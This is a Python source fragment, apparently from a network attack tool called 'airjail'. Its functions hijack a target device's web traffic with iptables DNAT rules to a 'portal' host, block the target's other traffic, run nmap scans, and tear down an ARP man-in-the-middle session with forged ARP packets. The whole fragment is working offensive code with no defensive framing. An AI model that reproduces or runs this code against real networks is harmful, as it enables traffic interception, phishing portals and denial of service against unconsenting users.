def _redirect_on(target_ip, portal_ip, port=80):
    subprocess.run(["sysctl","-w","net.ipv4.ip_forward=1"],
                   stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    cmds = [
        ["iptables","-t","nat","-A","PREROUTING",
         "-s",target_ip,"-p","tcp","--dport","80",
         "-j","DNAT","--to-destination",f"{portal_ip}:{port}"],
        ["iptables","-t","nat","-A","PREROUTING",
         "-s",target_ip,"-p","tcp","--dport","443",
         "-j","DNAT","--to-destination",f"{portal_ip}:{port}"],
        ["iptables","-A","FORWARD","-s",target_ip,
         "-p","tcp","!","--dport","80","-j","DROP"],
    ]
    for c in cmds:
        subprocess.run(c, check=False, stderr=subprocess.DEVNULL)

def _redirect_off(target_ip):
    subprocess.run(["iptables","-t","nat","-F"],
                   check=False, stderr=subprocess.DEVNULL)
    subprocess.run(["iptables","-D","FORWARD","-s",target_ip,
                    "-p","tcp","!","--dport","80","-j","DROP"],
                   check=False, stderr=subprocess.DEVNULL)

def session_save():
    """Persist JAILED dict to disk."""
    try:
        path = "/var/lib/airjail"
        os.makedirs(path, exist_ok=True)
        with open(f"{path}/session.json", "w") as f:
            json.dump(JAILED, f)
    except Exception:
        pass

def session_load():
    """Restore JAILED dict from disk if it exists."""
    global JAILED
    try:
        with open("/var/lib/airjail/session.json") as f:
            data = json.load(f)
        JAILED.update(data)
    except Exception:
        pass

def _run_nmap(ip: str):
    """nmap wrapper — 4 presets + custom. Results in Rich table."""
    console.print(f"\n[cyan]Port scanning [bold]{ip}[/bold]...[/]\n")
    presets = [
        ("-sV -T4 --open -p-",            "Full (65535 ports + version)"),
        ("-sV -T4 --open --top-ports 1000","Top 1000 + version"),
        ("-sV -sC -T4 --open -p-",         "Full + NSE scripts"),
        ("-sU -T4 --top-ports 100",         "Top 100 UDP"),
    ]
    for i, (flags, desc) in enumerate(presets, 1):
        console.print(f"  [bold yellow][{i}][/] {desc}")
    console.print(f"  [bold yellow][5][/] Custom flags")

    choice = Prompt.ask("[cyan]Preset[/]", default="2").strip()
    if choice.isdigit() and 1 <= int(choice) <= 4:
        flags = presets[int(choice)-1][0]
    elif choice == "5":
        flags = Prompt.ask("[cyan]nmap flags[/]").strip()
    else:
        flags = presets[1][0]

    cmd = ["nmap"] + flags.split() + [ip]
    console.print(f"[dim]  Running: {' '.join(cmd)}[/]\n")
    try:
        out = subprocess.check_output(cmd, text=True, stderr=subprocess.DEVNULL, timeout=120)
    except subprocess.TimeoutExpired:
        console.print("[red]Scan timed out.[/]"); return
    except Exception as e:
        console.print(f"[red]nmap error: {e}[/]"); return

    tbl = Table(title=f"[bold cyan]Ports — {ip}[/]",
                box=box.ROUNDED, border_style="cyan")
    tbl.add_column("Port",    style="yellow")
    tbl.add_column("State",   style="green")
    tbl.add_column("Service", style="cyan")
    tbl.add_column("Version", style="dim")

    for line in out.splitlines():
        m = re.match(r"(\d+/\w+)\s+(\w+)\s+(\S+)(?:\s+(.+))?", line)
        if m:
            tbl.add_row(m.group(1), m.group(2), m.group(3), m.group(4) or "")

    console.print(tbl)

def _mitm_stop(ip: str):
    """Stop an active ARP MITM session and restore ARP tables."""
    sess = _mitm_sessions.pop(ip, None)
    if not sess:
        return
    sess["stop_ev"].set()
    if sess.get("thread") and sess["thread"].is_alive():
        sess["thread"].join(timeout=3)
    # send gratuitous ARP restore to both sides
    if SCAPY_OK and GATEWAY_IP and GATEWAY_MAC:
        try:
            restore_t = ARP(op=2, pdst=ip, hwdst="ff:ff:ff:ff:ff:ff",
                            psrc=GATEWAY_IP, hwsrc=GATEWAY_MAC)
            restore_g = ARP(op=2, pdst=GATEWAY_IP, hwdst="ff:ff:ff:ff:ff:ff",
                            psrc=ip, hwsrc=sess.get("target_mac", "ff:ff:ff:ff:ff:ff"))
            send(restore_t, count=5, verbose=False, iface=IFACE)
            send(restore_g, count=5, verbose=False, iface=IFACE)
        except Exception:
            pass

